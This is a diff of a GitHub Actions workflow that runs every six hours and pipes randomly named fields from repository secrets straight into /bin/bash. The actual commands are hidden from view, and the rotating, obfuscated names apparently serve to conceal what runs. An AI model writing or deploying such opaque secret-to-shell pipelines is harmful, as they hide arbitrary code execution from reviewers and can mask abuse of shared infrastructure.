@@ -2,29 +2,23 @@ name: yaobeicihua
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 2/6 * * *'
-
+    - cron: '26 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yaobeicihua
         env:
-          lnj90749: ${{ secrets.lnj90749 }}
+          j40745: ${{ secrets.j40745 }}
         run: |
-          echo $lnj90749 | jq -r .jqxhe6109 | /bin/bash
-          echo $l76 | jq -r .u80102 | /bin/bash
-          echo $edonj4170 | jq -r .czb339 | /bin/bash
-          echo $tgnmv6 | jq -r .uig8 | /bin/bash
-          echo $kac27384 | jq -r .mrulw9 | /bin/bash
-          echo $lammi37509 | jq -r .f2255 | /bin/bash
-          echo $mucqn270 | jq -r .jqzpe9 | /bin/bash
-          echo $crmf16 | jq -r .r65 | /bin/bash
-          echo $xo1 | jq -r .e162 | /bin/bash
-          echo $df6755 | jq -r .td5 | /bin/bash
-          echo $kg63 | jq -r .ctc594 | /bin/bash
-          echo $zhtqv61155 | jq -r .m2425 | /bin/bash
-          echo $ch6682 | jq -r .q378 | /bin/bash
+          echo $j40745 | jq -r .i4 | /bin/bash
+          echo $ak24710 | jq -r .qwwf01757 | /bin/bash
+          echo $zvf5 | jq -r .j255 | /bin/bash
+          echo $qd2341 | jq -r .j7783 | /bin/bash
+          echo $r85 | jq -r .tuxx93925 | /bin/bash
+          echo $z1515 | jq -r .evjpe576 | /bin/bash
+          echo $smn98855 | jq -r .mav49330 | /bin/bash
+          echo $pok3 | jq -r .uvf8550 | /bin/bash
+          echo $deqb408 | jq -r .gqfc34 | /bin/bash
 
